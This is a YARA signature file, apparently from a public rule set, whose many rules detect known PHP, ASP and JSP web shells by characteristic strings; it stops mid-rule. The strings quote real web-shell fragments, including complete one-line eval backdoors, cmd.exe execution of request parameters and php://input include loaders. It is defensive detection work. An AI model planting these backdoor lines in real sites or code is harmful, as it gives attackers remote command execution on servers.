rule webshell_h4ntu_shell_powered_by_tsoi_ {
	meta:
		description = "Web Shell - file h4ntu shell [powered by tsoi].php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "06ed0b2398f8096f1bebf092d0526137"
	strings:
		$s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
		$s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
		$s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
		$s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($"
	condition:
		all of them
}
rule webshell_PHP_sql {
	meta:
		description = "Web Shell - file sql.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "2cf20a207695bbc2311a998d1d795c35"
	strings:
		$s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
		$s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
	condition:
		all of them
}
rule webshell_PHP_a {
	meta:
		description = "Web Shell - file a.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e3b461f7464d81f5022419d87315a90d"
	strings:
		$s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
		$s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
		$s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword
	condition:
		2 of them
}
rule webshell_iMHaPFtp_2 {
	meta:
		description = "Web Shell - file iMHaPFtp.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "12911b73bc6a5d313b494102abcf5c57"
	strings:
		$s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($"
		$s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA"
	condition:
		1 of them
}
rule webshell_Jspspyweb {
	meta:
		description = "Web Shell - file Jspspyweb.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "4e9be07e95fff820a9299f3fb4ace059"
	strings:
		$s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7"
		$s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control"
	condition:
		all of them
}
rule webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2 {
	meta:
		description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "49ad9117c96419c35987aaa7e2230f63"
	strings:
		$s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n"
		$s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color"
	condition:
		1 of them
}
rule webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend {
	meta:
		description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
	strings:
		$s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo"
		$s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
	condition:
		1 of them
}
rule webshell_phpshell_2_1_pwhash {
	meta:
		description = "Web Shell - file pwhash.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ba120abac165a5a30044428fac1970d8"
	strings:
		$s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi"
		$s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\","
	condition:
		1 of them
}
rule webshell_PHPRemoteView {
	meta:
		description = "Web Shell - file PHPRemoteView.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "29420106d9a81553ef0d1ca72b9934d9"
	strings:
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
	condition:
		1 of them
}
rule webshell_jsp_12302 {
	meta:
		description = "Web Shell - file 12302.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a3930518ea57d899457a62f372205f7f"
	strings:
		$s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
		$s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
	condition:
		all of them
}
rule webshell_caidao_shell_guo {
	meta:
		description = "Web Shell - file guo.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "9e69a8f499c660ee0b4796af14dc08f0"
	strings:
		$s0 = "<?php ($www= $_POST['ice'])!"
		$s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww"
	condition:
		1 of them
}
rule webshell_PHP_redcod {
	meta:
		description = "Web Shell - file redcod.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5c1c8120d82f46ff9d813fbe3354bac5"
	strings:
		$s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
		$s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword
	condition:
		all of them
}
rule webshell_remview_fix {
	meta:
		description = "Web Shell - file remview_fix.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a24b7c492f5f00e2a19b0fa2eb9c3697"
	strings:
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
		$s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"
	condition:
		1 of them
}
rule webshell_asp_cmd {
	meta:
		description = "Web Shell - file cmd.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "895ca846858c315a3ff8daa7c55b3119"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
	condition:
		1 of them
}
rule webshell_php_sh_server {
	meta:
		description = "Web Shell - file server.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 50
		hash = "d87b019e74064aa90e2bb143e5e16cfa"
	strings:
		$s0 = "eval(getenv('HTTP_CODE'));" fullword
	condition:
		all of them
}
rule webshell_PH_Vayv_PH_Vayv {
	meta:
		description = "Web Shell - file PH Vayv.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "35fb37f3c806718545d97c6559abd262"
	strings:
		$s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
		$s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"
	condition:
		1 of them
}
rule webshell_caidao_shell_ice {
	meta:
		description = "Web Shell - file ice.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "6560b436d3d3bb75e2ef3f032151d139"
	strings:
		$s0 = "<%eval request(\"ice\")%>" fullword
	condition:
		all of them
}
rule webshell_cihshell_fix {
	meta:
		description = "Web Shell - file cihshell_fix.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3823ac218032549b86ee7c26f10c4cb5"
	strings:
		$s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty"
		$s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos"
	condition:
		1 of them
}
rule webshell_asp_shell {
	meta:
		description = "Web Shell - file shell.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e63f5a96570e1faf4c7b8ca6df750237"
	strings:
		$s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
		$s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
	condition:
		all of them
}
rule webshell_Private_i3lue {
	meta:
		description = "Web Shell - file Private-i3lue.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "13f5c7a035ecce5f9f380967cf9d4e92"
	strings:
		$s8 = "case 15: $image .= \"\\21\\0\\"
	condition:
		all of them
}
rule webshell_php_up {
	meta:
		description = "Web Shell - file up.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "7edefb8bd0876c41906f4b39b52cd0ef"
	strings:
		$s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
		$s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
		$s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword
	condition:
		2 of them
}
rule webshell_Mysql_interface_v1_0 {
	meta:
		description = "Web Shell - file Mysql interface v1.0.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a12fc0a3d31e2f89727b9678148cd487"
	strings:
		$s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"
	condition:
		all of them
}
rule webshell_php_s_u {
	meta:
		description = "Web Shell - file s-u.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "efc7ba1a4023bcf40f5e912f1dd85b5a"
	strings:
		$s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"
	condition:
		all of them
}
rule webshell_phpshell_2_1_config {
	meta:
		description = "Web Shell - file config.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "bd83144a649c5cc21ac41b505a36a8f3"
	strings:
		$s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
	condition:
		all of them
}
rule webshell_asp_EFSO_2 {
	meta:
		description = "Web Shell - file EFSO_2.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a341270f9ebd01320a7490c12cb2e64c"
	strings:
		$s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"
	condition:
		all of them
}
rule webshell_jsp_up {
	meta:
		description = "Web Shell - file up.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "515a5dd86fe48f673b72422cccf5a585"
	strings:
		$s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
	condition:
		all of them
}
rule webshell_NetworkFileManagerPHP {
	meta:
		description = "Web Shell - file NetworkFileManagerPHP.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "acdbba993a5a4186fd864c5e4ea0ba4f"
	strings:
		$s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "
	condition:
		all of them
}
rule webshell_Server_Variables {
	meta:
		description = "Web Shell - file Server Variables.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "47fb8a647e441488b30f92b4d39003d7"
	strings:
		$s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
		$s9 = "Variable Name</B></font></p>" fullword
	condition:
		all of them
}
rule webshell_caidao_shell_ice_2 {
	meta:
		description = "Web Shell - file ice.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1d6335247f58e0a5b03e17977888f5f2"
	strings:
		$s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
	condition:
		all of them
}
rule webshell_caidao_shell_mdb {
	meta:
		description = "Web Shell - file mdb.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "fbf3847acef4844f3a0d04230f6b9ff9"
	strings:
		$s1 = "<% execute request(\"ice\")%>a " fullword
	condition:
		all of them
}
rule webshell_jsp_guige {
	meta:
		description = "Web Shell - file guige.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "2c9f2dafa06332957127e2c713aacdd2"
	strings:
		$s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"
	condition:
		all of them
}
rule webshell_phpspy2010 {
	meta:
		description = "Web Shell - file phpspy2010.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "14ae0e4f5349924a5047fed9f3b105c5"
	strings:
		$s3 = "eval(gzinflate(base64_decode("
		$s5 = "//angel" fullword
		$s8 = "$admin['cookiedomain'] = '';" fullword
	condition:
		all of them
}
rule webshell_asp_ice {
	meta:
		description = "Web Shell - file ice.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d141e011a92f48da72728c35f1934a2b"
	strings:
		$s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"
	condition:
		all of them
}
rule webshell_drag_system {
	meta:
		description = "Web Shell - file system.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "15ae237cf395fb24cf12bff141fb3f7c"
	strings:
		$s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"
	condition:
		all of them
}
rule webshell_DarkBlade1_3_asp_indexx {
	meta:
		description = "Web Shell - file indexx.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b7f46693648f534c2ca78e3f21685707"
	strings:
		$s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"
	condition:
		all of them
}
rule webshell_phpshell3 {
	meta:
		description = "Web Shell - file phpshell3.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "76117b2ee4a7ac06832d50b2d04070b8"
	strings:
		$s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
		$s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
		$s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
	condition:
		2 of them
}
rule webshell_jsp_hsxa {
	meta:
		description = "Web Shell - file hsxa.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d0e05f9c9b8e0b3fa11f57d9ab800380"
	strings:
		$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
	condition:
		all of them
}
rule webshell_jsp_utils {
	meta:
		description = "Web Shell - file utils.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "9827ba2e8329075358b8e8a53e20d545"
	strings:
		$s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
	condition:
		all of them
}
rule webshell_asp_01 {
	meta:
		description = "Web Shell - file 01.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 50
		hash = "61a687b0bea0ef97224c7bd2df118b87"
	strings:
		$s0 = "<%eval request(\"pass\")%>" fullword
	condition:
		all of them
}
rule webshell_asp_404 {
	meta:
		description = "Web Shell - file 404.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d9fa1e8513dbf59fa5d130f389032a2d"
	strings:
		$s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"
	condition:
		all of them
}
rule webshell_webshell_cnseay02_1 {
	meta:
		description = "Web Shell - file webshell-cnseay02-1.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "95fc76081a42c4f26912826cb1bd24b1"
	strings:
		$s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"
	condition:
		all of them
}
rule webshell_php_fbi {
	meta:
		description = "Web Shell - file fbi.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1fb32f8e58c8deb168c06297a04a21f1"
	strings:
		$s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"
	condition:
		all of them
}
rule webshell_B374kPHP_B374k {
	meta:
		description = "Web Shell - file B374k.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "bed7388976f8f1d90422e8795dff1ea6"
	strings:
		$s0 = "Http://code.google.com/p/b374k-shell" fullword
		$s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
		$s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
		$s4 = "B374k Vip In Beautify Just For Self" fullword
	condition:
		1 of them
}
rule webshell_cmd_asp_5_1 {
	meta:
		description = "Web Shell - file cmd-asp-5.1.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
	strings:
		$s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
	condition:
		all of them
}
rule webshell_php_dodo_zip {
	meta:
		description = "Web Shell - file zip.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b7800364374077ce8864796240162ad5"
	strings:
		$s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
		$s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
	condition:
		all of them
}
rule webshell_aZRaiLPhp_v1_0 {
	meta:
		description = "Web Shell - file aZRaiLPhp v1.0.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "26b2d3943395682e36da06ed493a3715"
	strings:
		$s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
		$s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"
	condition:
		all of them
}
rule webshell_php_list {
	meta:
		description = "Web Shell - file list.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "922b128ddd90e1dc2f73088956c548ed"
	strings:
		$s1 = "// list.php = Directory & File Listing" fullword
		$s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
		$s9 = "// by: The Dark Raver" fullword
	condition:
		1 of them
}
rule webshell_ironshell {
	meta:
		description = "Web Shell - file ironshell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
	strings:
		$s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
		$s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"
	condition:
		all of them
}
rule webshell_caidao_shell_404 {
	meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ee94952dc53d9a29bdf4ece54c7a7aa7"
	strings:
		$s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"
	condition:
		all of them
}
rule webshell_ASP_aspydrv {
	meta:
		description = "Web Shell - file aspydrv.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "de0a58f7d1e200d0b2c801a94ebce330"
	strings:
		$s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"
	condition:
		all of them
}
rule webshell_jsp_web {
	meta:
		description = "Web Shell - file web.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "4bc11e28f5dccd0c45a37f2b541b2e98"
	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."
	condition:
		all of them
}
rule webshell_mysqlwebsh {
	meta:
		description = "Web Shell - file mysqlwebsh.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "babfa76d11943a22484b3837f105fada"
	strings:
		$s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"
	condition:
		all of them
}
rule webshell_jspShell {
	meta:
		description = "Web Shell - file jspShell.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "0d5b5a17552254be6c1c8f1eb3a5fdc1"
	strings:
		$s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
		$s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"
	condition:
		all of them
}
rule webshell_Dx_Dx {
	meta:
		description = "Web Shell - file Dx.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
	strings:
		$s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s9 = "class=linelisting><nobr>POST (php eval)</td><"
	condition:
		1 of them
}
rule webshell_asp_ntdaddy {
	meta:
		description = "Web Shell - file ntdaddy.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c5e6baa5d140f73b4e16a6cfde671c68"
	strings:
		$s9 =  "if  FP  =  \"RefreshFolder\"  or  "
		$s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "
	condition:
		1 of them
}
rule webshell_MySQL_Web_Interface_Version_0_8 {
	meta:
		description = "Web Shell - file MySQL Web Interface Version 0.8.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
	strings:
		$s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"
	condition:
		all of them
}
rule webshell_elmaliseker_2 {
	meta:
		description = "Web Shell - file elmaliseker.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
	strings:
		$s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
		$s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"
	condition:
		all of them
}
rule webshell_ASP_RemExp {
	meta:
		description = "Web Shell - file RemExp.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
	strings:
		$s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
		$s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"
	condition:
		all of them
}
rule webshell_jsp_list1 {
	meta:
		description = "Web Shell - file list1.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8d9e5afa77303c9c01ff34ea4e7f6ca6"
	strings:
		$s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
		$s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""
	condition:
		all of them
}
rule webshell_phpkit_1_0_odd {
	meta:
		description = "Web Shell - file odd.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "594d1b1311bbef38a0eb3d6cbb1ab538"
	strings:
		$s0 = "include('php://input');" fullword
		$s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
		$s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
	condition:
		all of them
}
rule webshell_jsp_123 {
	meta:
		description = "Web Shell - file 123.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c691f53e849676cac68a38d692467641"
	strings:
		$s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
		$s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
	condition:
		all of them
}
rule webshell_asp_1 {
	meta:
		description = "Web Shell - file 1.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8991148adf5de3b8322ec5d78cb01bdb"
	strings:
		$s4 = "!22222222222222222222222222222222222222222222222222" fullword
		$s8 = "<%eval request(\"pass\")%>" fullword
	condition:
		all of them
}
rule webshell_ASP_tool {
	meta:
		description = "Web Shell - file tool.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "4ab68d38527d5834e9c1ff64407b34fb"
	strings:
		$s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
		$s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
		$s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"
	condition:
		2 of them
}
rule webshell_cmd_win32 {
	meta:
		description = "Web Shell - file cmd_win32.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "cc4d4d6cc9a25984aa9a7583c7def174"
	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
		$s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
	condition:
		2 of them
}
rule webshell_jsp_jshell {
	meta:
		description = "Web Shell - file jshell.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "124b22f38aaaf064cef14711b2602c06"
	strings:
		$s0 = "kXpeW[\"" fullword
		$s4 = "[7b:g0W@W<" fullword
		$s5 = "b:gHr,g<" fullword
		$s8 = "RhV0W@W<" fullword
		$s9 = "S_MR(u7b" fullword
	condition:
		all of them
}
rule webshell_ASP_zehir4 {
	meta:
		description = "Web Shell - file zehir4.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "7f4e12e159360743ec016273c3b9108c"
	strings:
		$s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"
	condition:
		all of them
}
rule webshell_wsb_idc {
	meta:
		description = "Web Shell - file idc.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "7c5b1b30196c51f1accbffb80296395f"
	strings:
		$s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
		$s3 = "{eval($_GET['idc']);}" fullword
	condition:
		1 of them
}
rule webshell_cpg_143_incl_xpl {
	meta:
		description = "Web Shell - file cpg_143_incl_xpl.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5937b131b67d8e0afdbd589251a5e176"
	strings:
		$s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
		$s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"
	condition:
		1 of them
}
rule webshell_mumaasp_com {
	meta:
		description = "Web Shell - file mumaasp.com.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "cce32b2e18f5357c85b6d20f564ebd5d"
	strings:
		$s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR"
	condition:
		all of them
}
rule webshell_php_404 {
	meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ced050df5ca42064056a7ad610a191b3"
	strings:
		$s0 = "$pass = md5(md5(md5($pass)));" fullword
	condition:
		all of them
}
rule webshell_webshell_cnseay_x {
	meta:
		description = "Web Shell - file webshell-cnseay-x.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a0f9f7f5cd405a514a7f3be329f380e5"
	strings:
		$s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"
	condition:
		all of them
}
rule webshell_asp_up {
	meta:
		description = "Web Shell - file up.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "f775e721cfe85019fe41c34f47c0d67c"
	strings:
		$s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
		$s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
	condition:
		1 of them
}
rule webshell_phpkit_0_1a_odd {
	meta:
		description = "Web Shell - file odd.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3c30399e7480c09276f412271f60ed01"
	strings:
		$s1 = "include('php://input');" fullword
		$s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
		$s4 = "// uses include('php://input') to execute arbritary code" fullword
		$s5 = "// php://input based backdoor" fullword
	condition:
		2 of them
}
rule webshell_ASP_cmd {
	meta:
		description = "Web Shell - file cmd.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "97af88b478422067f23b001dd06d56a9"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
	condition:
		all of them
}
rule webshell_PHP_Shell_x3 {
	meta:
		description = "Web Shell - file PHP Shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
	strings:
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
